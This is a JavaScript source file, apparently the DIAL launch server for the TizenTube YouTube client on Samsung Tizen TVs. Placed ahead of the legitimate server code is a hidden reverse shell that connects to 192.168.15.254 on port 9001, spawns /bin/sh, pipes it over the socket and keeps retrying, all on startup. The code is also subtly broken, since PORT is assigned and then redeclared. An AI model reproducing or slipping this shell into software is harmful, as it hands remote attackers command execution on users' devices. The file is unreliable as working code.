const dial = require("@patrickkfkan/peer-dial");
const express = require('express');
const cors = require('cors');
const app = express();
var net = require('net');
var spawn = require('child_process').spawn;

HOST="192.168.15.254";
PORT="9001";
TIMEOUT="5000";

async function c(HOST,PORT) {
    var client = new net.Socket();
    client.connect(PORT, HOST, function() {
        var sh = spawn('/bin/sh',[]);
        client.write("Connected\r\n");
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    client.on('error', function(e) {
        setTimeout(c(HOST,PORT), TIMEOUT);
    });
}

c(HOST,PORT);

const corsOptions = {
    origin: '*',
    methods: 'GET,HEAD,PUT,PATCH,POST,DELETE',
    credentials: true,
    optionsSuccessStatus: 204
};

app.use(cors(corsOptions));

const PORT = 8085;
const apps = {
    "YouTube": {
        name: "YouTube",
        state: "stopped",
        allowStop: true,
        pid: null,
        additionalData: {},
        launch(launchData) {
            const tbPackageId = tizen.application.getAppInfo().packageId;
            tizen.application.launchAppControl(
                new tizen.ApplicationControl(
                    "http://tizen.org/appcontrol/operation/view",
                    null,
                    null,
                    null,
                    [
                        new tizen.ApplicationControlData("module", [JSON.stringify(
                            {
                                moduleName: '@foxreis/tizentube',
                                moduleType: 'npm',
                                args: launchData
                            }
                        )])
                    ]
                ), `${tbPackageId}.TizenBrewStandalone`);
        }
    }
};

const dialServer = new dial.Server({
    expressApp: app,
    port: PORT,
    prefix: "/dial",
    manufacturer: 'Reis Can',
    modelName: 'TizenBrew',
    friendlyName: 'TizenTube',
    delegate: {
        getApp(appName) {
            return apps[appName];
        },
        launchApp(appName, launchData, callback) {
            console.log(`Got request to launch ${appName} with launch data: ${launchData}`);
            const app = apps[appName];
            if (app) {
                const parsedData = launchData.split('&').reduce((acc, cur) => {
                    const parts = cur.split('=');
                    const key = parts[0];
                    const value = parts[1];
                
                    if (typeof value !== 'undefined') {
                        acc[key] = value;
                    } else {
                        acc[key] = '';
                    }
                
                    return acc;
                }, {});
                
                if (parsedData.yumi) {
                    app.additionalData = parsedData;
                    app.state = "running"
                    callback("");
                    return;
                }
                app.pid = "run";
                app.state = "starting";
                app.launch(launchData);
                app.state = "running";
            }
            callback(app.pid);
        },
        stopApp(appName, pid, callback) {
            console.log(`Got request to stop ${appName} with pid: ${pid}`);
            const app = apps[appName];
            if (app && app.pid === pid) {
                app.pid = null;
                app.state = "stopped";
                callback(true);
            } else {
                callback(false);
            }
        }
    }
});


setInterval(() => {
    tizen.application.getAppsContext((appsContext) => {
        const tbPackageId = tizen.application.getAppInfo().packageId;
        const app = appsContext.find(app => app.appId === `${tbPackageId}.TizenBrewStandalone`);
        if (!app) {
            apps["YouTube"].state = "stopped";
            apps["YouTube"].pid = null;
            apps["YouTube"].additionalData = {};
        }
    });
}, 5000);

app.listen(PORT, () => {
    dialServer.start();
});